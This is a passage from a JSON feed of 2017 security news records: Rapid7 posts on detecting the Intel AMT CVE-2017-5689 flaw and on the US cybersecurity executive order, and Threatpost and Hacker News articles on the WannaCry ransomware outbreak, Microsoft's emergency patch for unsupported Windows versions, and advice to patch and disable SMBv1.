"4e2983e637c536c65ff2a8bf4d3b070f"}, {"key": "type", "hash": "d3ac13553cf6707b21b5d01104b4a7b7"}], "hash": "f41f654b74e173a3b6af6083bca9e9b32cc8d5df07f7c1aa25b199af7b13aea3"}, {"lastseen": "2017-05-12T22:48:17", "references": [], "description": "<!-- [DocumentBodyStart:a4f46d68-141b-4435-96ff-09221c0fba62] --><div class=\"jive-rendered-content\"><p>We’ve had some inquiries about checks for CVE-2017-5689, a vulnerability affecting Intel AMT devices. On May 5th, 2017, we released a potential vulnerability check that can help identify assets that may be vulnerable. We initially ran into issues with trying to determine the exact version of the firmware remotely, and so a potential check was released so that you would still be able to identify devices that may be impacted by this.</p><p style=\"min-height: 8pt; padding: 0px;\"> </p><p>We didn't stop there though. As part of yesterday's Nexpose release, we issued an updated vulnerability check that is a remote direct condition test that will definitively identify the issue if it is present. Detection of this vulnerability does not require authentication to the asset.</p><p style=\"min-height: 8pt; padding: 0px;\"> </p><p>Please note, you will have to modify your scan template to include a couple of extra TCP ports: 16992 and 16993. To learn more about how to configure your scan template see <a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fhelp.rapid7.com%2Finsightvm%2Fen-us%2F%23Files%2FConfiguring_service_discovery.html%253FTocPath%253DTune%25253A%252520Scan%252520templates%25252C%252520custom%252520policies%25252C%252520risk%252520strategies%257C_____5\" rel=\"nofollow\" target=\"_blank\">this help page</a> for details. Happy Hunting!</p><p style=\"min-height: 8pt; padding: 0px;\"> </p><p><strong>UPDATE - May 12th, 2017: </strong>On Wednesday, May 10th, we also added an <a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F8353\" rel=\"nofollow\" target=\"_blank\">unauthenticated scanner</a> in Metasploit to check for vulnerable systems in a network, gathering metadata such as firmware version, serial number, vendor, and model number.</p></div><!-- [DocumentBodyEnd:a4f46d68-141b-4435-96ff-09221c0fba62] -->", "edition": 3, "reporter": "Alex Hin", "published": "2017-05-12T22:43:51", "title": "On the lookout for Intel AMT CVE-2017-5689", "type": "rapid7community", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": ["CVE-2017-5689"], "modified": "2017-05-12T22:43:51", "id": "RAPID7COMMUNITY:3E2118D4B45B40AADFB608DCC53EA3E8", "href": "https://community.rapid7.com/community/nexpose/blog/2017/05/11/on-the-lookout-for-intel-amt-cve-2017-5689", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "772120e2e65a23e626e144520594fe1e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "863298b2b494e158b05aecaf78fbcbe5"}, {"key": "href", "hash": "3e2118d4b45b40aadfb608dcc53ea3e8"}, {"key": "modified", "hash": "5472f3b17d8c89c92b97901c46fcf21d"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "5472f3b17d8c89c92b97901c46fcf21d"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "523d13a9f3aaab19351e66ae4a687a66"}, {"key": "title", "hash": "b1bc5ff19cb1a61f283db3ff47017aea"}, {"key": "type", "hash": "d3ac13553cf6707b21b5d01104b4a7b7"}], "hash": "f7e62ef98c97cf326c684c866979e11dbce92582c69c427cc07fa79420026b3c"}, {"lastseen": "2017-05-12T21:48:18", "references": [], "description": "<!-- [DocumentBodyStart:4a93b140-e9e5-414e-9fa3-173f4bec3c11] --><div class=\"jive-rendered-content\"><p style=\"font-size: 12pt; font-family: Calibri; color: #000000;\"><span style=\"font-family: helvetica;\">Yesterday President Trump issued an Executive Order on cybersecurity: <a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fwww.whitehouse.gov%2Fthe-press-office%2F2017%2F05%2F11%2Fpresidential-executive-order-strengthening-cybersecurity-federal\" rel=\"nofollow\" target=\"_blank\">“Strengthening the Cybersecurity of Federal Networks and Critical Infrastructure.” </a> </span></p><p style=\"min-height: 8pt; padding: 0px; font-size: 12pt; font-family: Calibri; color: #000000;\"> </p><p style=\"font-size: 12pt; font-family: Calibri; color: #000000;\"><span style=\"color: #000000; font-family: helvetica;\">The Executive Order (EO) appears broadly positive and well thought out, though it is just the beginning of a long process and not a sea change in itself. The EO directs agencies to come up with plans for securing and modernizing their networks; develop international cyber norms; work out a deterrence strategy against hacking; and reduce the threat of botnets – all constructive, overdue goals. <span style=\"color: #000000;\">Below are an overview, a highlight reel, and some additional takeaway thoughts.</span></span></p><p style=\"min-height: 8pt; padding: 0px; font-size: 12pt; font-family: Calibri; color: #000000;\"> </p><h2><span style=\"font-family: helvetica;\"><strong>Cybersecurity Executive Order Overview</strong></span></h2><p style=\"font-size: 12pt; font-family: Calibri; color: #000000;\"><span style=\"font-family: helvetica;\">Executive orders are issued only by the President, direct the conduct of executive branch agencies (not the private sector, legislature, or judiciary), and have the force of law. All public (not classified) EOs are published <a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fwww.whitehouse.gov%2Fbriefing-room%2Fpresidential-actions%2Fexecutive-orders\" rel=\"nofollow\" style=\"color: #954f72;\" target=\"_blank\">here</a>. This cyber EO is the first major move the Trump White House (as distinct from other federal agencies) has made publicly on cybersecurity. </span></p><p style=\"min-height: 8pt; padding: 0px; font-size: 12pt; font-family: Calibri; color: #000000;\"> </p><p style=\"font-size: 12pt; font-family: Calibri; color: #000000;\"><span style=\"font-family: helvetica;\">The cyber Executive Order takes action on three fronts:</span></p><ol><li><strong>Federal network security.</strong> Directs agencies to take a risk management approach, adopt the NIST Framework, and favor shared services and consolidated network architectures (including for cloud and cybersecurity services).</li><li><strong>Protecting critical infrastructure.</strong> Directs agencies to work with the private sector to protect critical infrastructure, incentivize more transparency on critical infrastructure cybersecurity, improve resiliency of communication infrastructure, and reduce the threat of botnets.</li><li><strong>National preparedness and workforce development.</strong> Directs agencies to assess strategic options for deterring and defending against adversaries. Directs agencies to report their international cybersecurity priorities, and to promote international norms on cybersecurity.</li></ol><p style=\"min-height: 8pt; padding: 0px;\"> </p><h2>Cybersecurity Executive Order Highlights</h2><ul><li><span style=\"text-decoration: underline; font-family: helvetica;\">Federal network cybersecurity:</span><ul><li><span style=\"font-family: helvetica;\">The US will now manage cyber risks as an executive branch enterprise. The President is holding cabinet and agency heads accountable for implementing risk management measures commensurate with risks and magnitude of harm. [Sec. 1(c)(i)] </span></li><li><span style=\"font-family: helvetica;\">Agencies are directed to immediately use the NIST Framework for Improving Critical Infrastructure Cybersecurity (<a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=https%3A%2F%2Fwww.nist.gov%2Fcyberframework\" rel=\"nofollow\" style=\"color: #954f72;\" target=\"_blank\">NIST Framework</a>) to manage their cyber risk. <span style=\"text-decoration: underline;\">[</span>Sec. 1(c)(ii)]</span></li><li><span style=\"font-family: helvetica;\">DHS and OMB must report to the President, within 120 days, a plan to secure federal networks, address budgetary needs for cybersecurity, and reconcile all policies and standards with the NIST Framework. [Sec. 1(c)(iv)]</span></li><li><span style=\"font-family: helvetica;\">Agencies must now show preference for shared IT services (including cloud and cybersecurity services) in IT procurement. [Sec. 1(c)(vi)(A)] This effort will be coordinated by the <a class=\"jive-link-external-small\" href=\"https://community.rapid7.com/external-link.jspa?url=http%3A%2F%2Fmoney.cnn.com%2F2017%2F05%2F01%2Ftechnology%2Ftrump-american-technology-council%2F\" rel=\"nofollow\" style=\"color: #954f72;\" target=\"_blank\">American Technology Council</a>. [Sec. 1(c)(vi)(B)]</span></li><li><span style=\"font-family: helvetica;\">The White House, in coordination with DHS and other agencies, must submit a report to the President, within 60 days, on modernizing federal IT, including transitioning all agencies to consolidated network architectures and shared IT services – with specific mention of cybersecurity services. [Sec. 1(c)(vi)(B)-(C)] Defense and intel agencies must submit a similar report for national security systems within 150 days. [Sec. 1(c)(vii)]</span></li></ul></li></ul><p style=\"min-height: 8pt; padding: 0px;\"> </p><ul><li><span style=\"text-decoration: underline; font-family: helvetica;\"><span>Critical infrastructure cybersecurity:</span></span><ul style=\"list-style-type: circle;\"><li><span style=\"font-family: helvetica;\">Critical infrastructure includes power plants, oil and gas, financial system, other systems that would risk national security if damaged. The EO states that it is the government’s policy to use its authorities and capabilities to support the cybersecurity risk management of critical infrastructure. [Sec. 2(a)]</span></li></ul></li></ul><ul><ul style=\"list-style-type: circle;\"><li><span style=\"font-family: helvetica;\">The EO directs DHS, DoD, and other agencies to assess authorities and opportunities to coordinate with the private sector to defend critical infrastructure. [Sec. 2(b)] </span></li><li><span style=\"font-family: helvetica;\">DHS and DoC must submit a report to the President, within 90 days, on promoting market transparency of cyber risk management practices by critical infrastructure operators, especially those that are publicly traded. [Sec. 2(c)]</span></li><li><span style=\"font-family: helvetica;\">DoC and DHS shall work with industry to promote voluntary actions to improve the resiliency of internet and communications infrastructure and “dramatically\" reduce the threat of botnet attacks. [Sec. 2(d)]</span></li><li><span style=\"font-family: helvetica;\">Agencies shall assess cybersecurity risks and mitigation capabilities related to the electrical sector and the defense industrial base (including supply chain). [Sec. 2(e)-(f)]</span></li></ul></ul><p style=\"min-height: 8pt; padding: 0px;\"> </p><ul><li><span style=\"text-decoration: underline; font-family: helvetica;\">National preparedness and workforce:</span><ul style=\"list-style-type: circle;\"><li><span style=\"font-family: helvetica;\">The EO reiterates the US government’s commitment to an open, secure Internet that fosters innovation and communication while respecting privacy and guarding against disruption. [Sec. 3(a)]</span></li><li><span style=\"font-family: helvetica;\">Cabinet members must submit a report to the President, within 90 days, on options for deterring adversaries and protecting Americans from cyber threats. [Sec. 3(b)]</span></li><li><span style=\"font-family: helvetica;\">Cabinet members must report to the President, within 45 days, on international cybersecurity priorities, including investigation, attribution, threat info sharing, response, etc. The agencies must report to the President, within 90 days, on a strategy for international cooperation in cybersecurity. [Sec. 3(c)]</span></li><li><span style=\"font-family: helvetica;\">Agencies must report to the President, within 120 days, how to grow and sustain a workforce skilled in cybersecurity and related fields. [Sec. 3(d)(i)] </span></li><li><span style=\"font-family: helvetica;\">The Director of National Intelligence must report to the President, within 60 days, on workforce development practices of foreign peers to compare long-term competitiveness in cybersecurity. [Sec. 3(d)(ii)] Agencies must report to the President, within 150 days, on US efforts to maintain advantage in national-security-related cyber capabilities. [Sec. 3(d)(iii)]</span></li></ul></li></ul><p style=\"min-height: 8pt; padding: 0px;\"> </p><h2><span style=\"font-family: helvetica;\">The Executive Order is just the start</span></h2><p><span style=\"color: #000000; font-family: helvetica;\">As you can see, the EO initially requires a lot of multi-agency reports, which we can expect to surface in coming months, and which can then be used to craft official policy. There are opportunities for the private sector to provide input to the agencies as they develop those reports, though the 2-4 month timelines are pretty tight for such complex topics. But the reports are just the beginning of long processes to accomplish the goals set forth in the EO - it will take a lot longer than 60 days, for example, to fully flesh out and implement a plan to modernize federal IT. The long haul is beginning, and we won't know how transformative or effective this process will be for some time.</span></p><p style=\"min-height: 8pt; padding: 0px;\"> </p><p><span style=\"font-family: helvetica;\"><span style=\"color: #000000;\">Thankfully, contrary to prior rumors, the EO does not over-expand the role of DoD in securing national networks, nor does the EO call for an expansion of government authority over the private sector (although the reports agencies must produce under the EO may call for new authorities). However, the EO also does not directly touch on important topics such as data breach, IoT insecurity, support for strong encryption, vuln disclosure, or unfilled critical appointments (such as a national CTO).</span><span style=\"color: #000000;\"> <span style=\"color: #000000;\">Rapid7 applauds the effort toward enforcing enhanced security to better protect organizations, infrastructure, and individuals through the EO, though </span>we hope to see further consideration on other key cybersecurity issues in the future.</span></span></p></div><!-- [DocumentBodyEnd:4a93b140-e9e5-414e-9fa3-173f4bec3c11] -->", "edition": 1, "reporter": "Harley Geiger", "published": "2017-05-12T21:23:08", "title": "White House Cybersecurity Executive Order Summary", "type": "rapid7community", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-12T21:23:08", "id": "RAPID7COMMUNITY:69F3674E71C6E97F339E450B70E373C5", "href": "https://community.rapid7.com/community/infosec/blog/2017/05/12/white-house-cybersecurity-executive-order-summary", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "d98c327ff8f222d5737c4a7e17e56526"}, {"key": "href", "hash": "69f3674e71c6e97f339e450b70e373c5"}, {"key": "modified", "hash": "5bd90ec493b158134b022971c61b7b6f"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "5bd90ec493b158134b022971c61b7b6f"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "430ed8e5b7c50347869ae7760f20172b"}, {"key": "title", "hash": "ddf4a5af373f34aa4c8a6b7ad78f620a"}, {"key": "type", "hash": "d3ac13553cf6707b21b5d01104b4a7b7"}], "hash": "f7c4270bfabf3b64d4708c74bad5494b4f42f1bed752098fb03ff723b3a31bfb"}], "threatpost": [{"lastseen": "2017-05-13T17:27:54", "references": ["https://threatpost.com/leaked-nsa-exploit-spreading-ransomware-worldwide/125654/", "https://threatpost.com/leaked-nsa-exploit-spreading-ransomware-worldwide/125654/", "https://technet.microsoft.com/en-us/library/security/ms17-010.aspx", "https://threatpost.com/threatpost-news-wrap-may-12-2017/125643/", "https://threatpost.com/new-jaff-ransomware-part-of-active-necurs-spam-blitz/125648/", "https://threatpost.com/nsas-doublepulsar-kernel-exploit-in-use-internet-wide/125165/", "https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/", "https://securelist.com/blog/incidents/78351/wannacry-ransomware-used-in-widespread-attacks-all-over-the-world/"], "description": "Microsoft has taken the extraordinary step of providing an [emergency update](<https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/>) for unsupported Windows XP and Windows 8 machines in the wake of Friday\u2019s [WannaCry ransomware outbreak](<https://threatpost.com/leaked-nsa-exploit-spreading-ransomware-worldwide/125654/>).



Unknown attackers were using the EternalBlue exploit leaked by the ShadowBrokers in April to spread WannaCry, a variant of the WCry malware, which surfaced in February. EternalBlue, an offensive hacking tool allegedly developed by the NSA, exploits a Windows SMBv1 vulnerability that was patched by Microsoft in March in security bulletin [MS17-010](<https://technet.microsoft.com/en-us/library/security/ms17-010.aspx>).



### Related Posts



#### [New Jaff Ransomware Part Of Active Necurs Spam Blitz](<https://threatpost.com/new-jaff-ransomware-part-of-active-necurs-spam-blitz/125648/> \"Permalink to New Jaff Ransomware Part Of Active Necurs Spam Blitz\" )



May 12, 2017 , 1:54 pm



#### [Leaked NSA Exploit Spreading Ransomware Worldwide](<https://threatpost.com/leaked-nsa-exploit-spreading-ransomware-worldwide/125654/> \"Permalink to Leaked NSA Exploit Spreading Ransomware Worldwide\" )



May 12, 2017 , 1:32 pm



#### [Threatpost News Wrap, May 12, 2017](<https://threatpost.com/threatpost-news-wrap-may-12-2017/125643/> \"Permalink to Threatpost News Wrap, May 12, 2017\" )



May 12, 2017 , 12:00 pm



Yesterday\u2019s attack overran many businesses in Europe at the start, hitting hardest in Russia, Ukraine and India. Large telecommunications companies in Spain and many NHS healthcare facilities in the United Kingdom were also affected, as were other enterprises worldwide. Employees were told to shut down and unplug machines, and in the case of the U.K. hospitals, patient care at many facilities was affected. Non-emergency surgeries were postponed and patients were diverted to other facilities.



The ransomware locked up machines, encrypted files and demanded approximately $600 in Bitcoin for a recovery key.



Microsoft acknowledged the dire straits many of its customers were in, and rolled out a patch for all computers that were not protected by the March update.



\u201cSeeing businesses and individuals affected by cyberattacks, such as the ones reported today, was painful,\u201d Microsoft said last night. \u201cMicrosoft worked throughout the day to ensure we understood the attack and were taking all possible actions to protect our customers.\u201d



The March update was made available one month before the ShadowBrokers\u2019 high-profile leak of Windows exploits, including the Fuzzbunch platform that included EternalBlue and other exploits. EternalBlue targeted a then-unknown Windows SMBv1 remote code execution vulnerability. The widespread impact of yesterday\u2019s attack\u2014close to 100,000 infections so far in 99 countries by some accounts\u2014indicates a lack of patching vigilance despite ample warning.



Experts immediately warned of the potential [severity and staying power of MS17-010](<https://threatpost.com/nsas-doublepulsar-kernel-exploit-in-use-internet-wide/125165/>), comparing it to MS08-067 (Conficker). Some, such as Sean Dillon of RiskSense and Matthew Hickey of The Hacker House, telling Threatpost that it would be a matter of time before criminals would take advantage of the flaw to spread ransomware and other commodity attacks through this exploit.



While experts said that attackers could scan for SMB servers exposed to the internet on port 445 (not a recommended practice) and send malicious packets their way, Microsoft said yesterday it was also aware of phishing attacks spreading the ransomware.



\u201cGiven the potential impact to customers and their businesses, we made the decision to make the Security Update for platforms in custom support only, Windows XP, Windows 8, and Windows Server 2003, broadly available for download,\u201d Microsoft said. \u201cThis decision was made based on an assessment of this situation, with the principle of protecting our customer ecosystem overall, firmly in mind.\u201d



Microsoft said that it also released an update for Windows Defender that detects the threat as Ransom:Win32/WannaCrypt.



\u201cThis attack type may evolve over time, so any additional defense-in-depth strategies will provide additional protections,\u201d Microsoft said in its advisory. \u201cFor example, to further protect against SMBv1 attacks, customers should consider blocking legacy protocols on their networks.\u201d



Kaspersky Lab on Friday published its [analysis of the ransomware](<https://securelist.com/blog/incidents/78351/wannacry-ransomware-used-in-widespread-attacks-all-over-the-world/>), providing a list of .onion domains used by the malware on Tor hidden services for command and control. It also published hashes for the ransomware samples it has found in the wild, and detection names.



In addition to installing the available patches from Microsoft, Kaspersky Lab said its System Watcher component is able to roll back changes implemented by the ransomware.



\u201cThis is extremely useful in case a ransomware sample slips past defenses and attempts to encrypt the data on the disk,\u201d Kaspersky Lab said.", "edition": 1, "reporter": "Michael Mimoso", "published": "2017-05-13T11:30:00", "title": "Microsoft Releases XP Patch for WannaCry Ransomware", "type": "threatpost", "threatPostCategory": "Uncategorized", "objectVersion": "1.2", "bulletinFamily": "info", "cvelist": [], "modified": "2017-05-13T15:31:57", "id": "MICROSOFT-RELEASES-XP-PATCH-FOR-WANNACRY-RANSOMWARE/125671", "href": "https://threatpost.com/microsoft-releases-xp-patch-for-wannacry-ransomware/125671/", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "caf9b6b99962bf5c2264824231d7a40c"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "4ef71a0afa4ab77043fda24269d286ec"}, {"key": "href", "hash": "4340d9bde0edfd8c883dff446a82641e"}, {"key": "modified", "hash": "e82e68fbcff72996ed76217a7484dec1"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "2078f74ca14afbfecbc5904d09503b1e"}, {"key": "references", "hash": "b07f20963f65c5d4754d8f0bb416fbaa"}, {"key": "reporter", "hash": "3989ed69976f3e35ce6e4daa0caaf96a"}, {"key": "threatPostCategory", "hash": "0d015d96f63a8c12d96b8399482b593f"}, {"key": "title", "hash": "9294d4ae575b601f096263b6ea3949a6"}, {"key": "type", "hash": "78295e0f58b887188b62cad09f8e24d4"}], "hash": "dda829a7a8c5d7601779af03e2d05ff94c5e33882ee7130e0dc367c4b0ad103d"}], "thn": [{"lastseen": "2017-05-13T23:23:25", "references": [], "description": "[![wannacry-2-ransomware-attack](https://4.bp.blogspot.com/-Ux9h_SvtqBM/WRd40R5HFNI/AAAAAAAAsoM/btA0-iOHCywuHwoyA-OETIyzW_vFvbThACLcB/s1600/wannacry-2-ransomware-attack.png)](<https://4.bp.blogspot.com/-Ux9h_SvtqBM/WRd40R5HFNI/AAAAAAAAsoM/btA0-iOHCywuHwoyA-OETIyzW_vFvbThACLcB/s1600/wannacry-2-ransomware-attack.png>)



If you are following the news, by now you might be aware that a security researcher has activated a \"Kill Switch\" to stop [**WannaCry ransomware**](<http://thehackernews.com/2017/05/wannacry-ransomware-windows.html>) from spreading further, but it's not over, criminals have just launched **WannaCry 2.0** with no 'kill-switch' functionality. 

 

WannaCry has already infected over 200,000 computers across 99 countries worldwide only in past two days, and now this latest version can take over other hundreds of thousands of unpatched computers without any disruption. 

 

For those unaware, WannaCry is an insanely fast-spreading ransomware malware that leverages a [Windows SMB exploit](<http://thehackernews.com/2017/04/window-zero-day-patch.html>) to target a computer running on unpatched or unsupported versions of Windows and servers and then spread itself like a worm to infect other vulnerable systems in the internal network. 

 

The SMB vulnerability has been identified as EternalBlue, a collection of hacking tools allegedly created by the NSA and then subsequently dumped by a hacking group calling itself \"[The Shadow Brokers](<http://thehackernews.com/2017/04/nsa-hacking-tools.html>)\" over a month ago. 

 





[So far, Criminals behind WannaCry Ransomware have received nearly 100 payments from victims, total 15 Bitcoins, equals to USD $26,090.](<https://twitter.com/intent/tweet?text=So+far%2C+Criminals+behind+%23WannaCry+have+received+100+payments+from+victims%2C+total+15+Bitcoins%2C+equals+to+USD+%2426%2C090+http%3A%2F%2Fthehackernews.com%2F2017%2F05%2Fwannacry-ransomware-cyber-attack.html>) 





[CLICK TO TWEET__](<https://twitter.com/intent/tweet?text=So+far%2C+Criminals+behind+%23WannaCry+have+received+100+payments+from+victims%2C+total+15+Bitcoins%2C+equals+to+USD+%2426%2C090+http%3A%2F%2Fthehackernews.com%2F2017%2F05%2Fwannacry-ransomware-cyber-attack.html>)



 





### 

No, It's not over yet, WannaCry 2.0 is on hunt!



 

In our previous [two](<http://thehackernews.com/2017/05/wannacry-ransomware-windows.html>) [articles](<http://thehackernews.com/2017/05/wannacry-ransomware-unlock.html>), we put together more information about this massive ransomware campaign, also explaining how the researcher, known as [MalwareTech](<https://twitter.com/MalwareTechBlog/status/863187104716685312>), accidentally halted the global spread of WannaCry by registering a domain name hidden in the malware, but it does not repair computers that are already infected. 

 

That domain was responsible for keeping WannaCry propagating and spreading like a worm, but MalwareTech registered the domain in question, and created a sinkhole \u2013 tactic researchers use to redirect traffic from the infected machines to a self-controlled system. 

 

If you are thinking that activating the kill switch has completely stopped the infection, then you are mistaken, because as soon as the attackers realize, they came back. 

 

[Costin Raiu](<https://twitter.com/craiu>), the director of global research and analysis team at Kaspersky Labs has confirmed the arrival of WannaCry 2.0 variants without kill-switch function. 





> \"I can confirm we've had versions without the kill switch domain connect since yesterday,\" Raiu [told](<https://motherboard.vice.com/en_us/article/round-two-wannacry-ransomware-that-struck-the-globe-is-back>) Motherboard.



So, expect a new wave of ransomware attack, with an updated WannaCry variant, which would be difficult to stop, until and unless all vulnerable systems get patched. 





> \"The next attacks are inevitable, you can simply patch the existing samples with a hex editor and it'll continue to spread. We will see a number of variants of this attack over the coming weeks and months so it's important to patch hosts.\" [Matthew Hickey](<https://twitter.com/hackerfantastic>), a security expert and co-founder of Hacker House says The Hacker News.



Instead of depending upon mass email spamming, just like an ordinary malware campaign, WannaCry cyber attack leverages SMB exploit to remotely hijack vulnerable computers just by scanning every IP address on the Internet. 

 

Even after WannaCry made headlines all over the Internet and media, there are still hundreds of thousands of unpatched systems easily available open to the Internet. 





> \"The worm can be modified to spread other payloads not just WCry and we may see other malware campaigns piggybacking off this samples success.\" Hickey says.



So, the new strain of WannaCry 2.0 malware would not take enough time to take over these systems as well as others connected to the same local network. 

 





### Demo of WannaCry Ransomware Infection



 

Matthew has also provided The Hacker News two video demonstrations, showing packet traces that confirm the use of Windows SMB vulnerability (MS17-010). 





 

And Second one... 

 





Hickey also warned: Since, the WannaCry is a single executable file, so it can also be spread through other regular exploit vectors, such as spear phishing, drive-by-download attack, and malicious torrent files download. 

 





### Get Prepared: Install Security Patches & Disable SMBv1



> MalwareTech also [warned](<https://twitter.com/MalwareTechBlog/status/863191272969973760>): \"It's very important [for] everyone [to] understand that all they [the attackers] need to do is change some code and start again. Patch your systems now!\"



As we notified today, Microsoft took an unusual step to protect its customers with an unsupported version of Windows \u2014 including Windows XP, Vista, Windows 8, Server 2003 and 2008 \u2014 by [releasing security patches](<http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598>) that fix SMB flaw currently being exploited by the WannaCry ransomware. 

 

Even after this, I believe, many individuals remain unaware of the new patches and many organizations running on older or unpatched versions of Windows, who are considering to upgrade their operating systems, would take time as well as it\u2019s going to cost them money for getting new licenses. 

 

So, users and organizations are strongly advised to install available Windows patches as soon as possible, and also consider disabling SMBv1 ([follow these steps](<https://support.microsoft.com/en-in/help/2696547/how-to-enable-and-disable-smbv1,-smbv2,-and-smbv3-in-windows-vista,-windows-server-2008,-windows-7,-windows-server-2008-r2,-windows-8,-and-windows-server-2012>)), to prevent similar future cyber attacks. 

 

**For god sake:** Apply Patches. Microsoft has been very generous to you. 





> Quick Tip to stop [#WannaCry](<https://twitter.com/hashtag/WannaCry?src=hash>) (for all Windows users, even if you have installed the updates, Just disable SMB if not in use) [pic.twitter.com/zfhj0sS4ZY](<https://t.co/zfhj0sS4ZY>)

> 

> \u2014 The Hacker News (@TheHackersNews) [May 13, 2017](<https://twitter.com/TheHackersNews/status/863432319272574976>)



 

Almost all antivirus vendors have already been added signatures to protect against this latest threat. Make sure you are using a good antivirus, and keep it always up-to-date. 

 

Moreover, you can also follow some [basic security practices](<http://thehackernews.com/2017/05/wannacry-ransomware-windows.html>) I have listed to protect yourself from such threats.

", "edition": 4, "reporter": "Swati Khandelwal", "published": "2017-05-13T09:13:00", "title": "It\u2019s Not Over, WannaCry 2.0 Ransomware Just Arrived With No 'Kill-Switch'", "type": "thn", "objectVersion": "1.2", "bulletinFamily": "info", "cvelist": [], "modified": "2017-05-13T23:07:17", "id": "THN:47DB8C2A1C8370FE17549FC048204FE2", "href": "http://thehackernews.com/2017/05/wannacry-ransomware-cyber-attack.html", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "caf9b6b99962bf5c2264824231d7a40c"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "d9dc9c5e29fc1573a4472057c2e6e145"}, {"key": "href", "hash": "47db8c2a1c8370fe17549fc048204fe2"}, {"key": "modified", "hash": "90e1a65f72b260569ee079116e36d602"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "28990850116c61be33c67e3a8f8b2ae3"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "dfd5038481993fc18b2f3cdd80139048"}, {"key": "title", "hash": "87560b9d03e06f8038af37d542eacf19"}, {"key": "type", "hash": "05b17d439d33369be9ea6552b64028b7"}], "hash": "551b0895ec6741518bdda18a03ca35a619efa9104d513acc04d94b14b0d830d7"}, {"lastseen": "2017-05-13T22:23:25", "references": [], "description": "[![wannacry-ransomware-decrypt-unlock-files](https://3.bp.blogspot.com/-AkDNBNg_D4s/WRbF1-99I5I/AAAAAAAAsnQ/TG_qUHtZOEgyI8FZub5Ltw23XGdeU3mxQCLcB/s1600/wannacry-ransomware-decrypt-unlock-files.jpg)](<https://3.bp.blogspot.com/-AkDNBNg_D4s/WRbF1-99I5I/AAAAAAAAsnQ/TG_qUHtZOEgyI8FZub5Ltw23XGdeU3mxQCLcB/s1600/wannacry-ransomware-decrypt-unlock-files.jpg>)



**Update \u2014** If you are thinking that activating the kill-switch has completely stopped the WannaCry Ransomware, then you are mistaken. [WannaCry 2.0 version has just arrived](<http://thehackernews.com/2017/05/wannacry-ransomware-cyber-attack.html>) without any 'kill-switch' function. Get prepared for the next massive wave of ransomware attacks. 

 





 

In the wake of the [largest ransomware attack](<http://thehackernews.com/2017/05/wannacry-ransomware-unlock.html>) in the history that had already infected over 114,000 Windows systems worldwide since last 24 hours, Microsoft just took an unusual step to protect its customers with out-of-date computers. 

 

Microsoft has just released an [emergency security patch update](<http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598>) for all its unsupported version of Windows, including Windows XP, Vista, Windows 8, Server 2003 and 2008 Editions. 

 

So, if your organization, for some reason, is still running on Windows XP or Vista, you are strongly advised to download and **[APPLY PATCH NOW](<https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/>)**! 

 

**[WannaCrypt](<http://thehackernews.com/2017/05/wannacry-ransomware-unlock.html>)**, or also known as WannaCry, is a new ransomware that wreaked havoc across the world last night, which spreads like a worm by leveraging a Windows [SMB vulnerability](<http://thehackernews.com/2017/04/window-zero-day-patch.html>) (MS17-010) that has been previously fixed by Microsoft in March. 

 





[![windows-wannacry-smb-patch-update](https://1.bp.blogspot.com/-HwqXAWHrv2o/WRbL0OLJkQI/AAAAAAAAsng/8mWtGz0dkQAiSYzDi-LvknDZ5PFaB7GrwCLcB/s1600/windows-wannacry-smb-patch-update.png)](<https://1.bp.blogspot.com/-HwqXAWHrv2o/WRbL0OLJkQI/AAAAAAAAsng/8mWtGz0dkQAiSYzDi-LvknDZ5PFaB7GrwCLcB/s1600/windows-wannacry-smb-patch-update.png>)



 

A large number of successful infections of the WannaCry ransomware at an astonishing pace concludes that either significant number of users have not yet installed the security patch released in March (MS17-010) or they are still running an unsupported version of Windows for which Microsoft is no longer releasing any security update. 

 

 





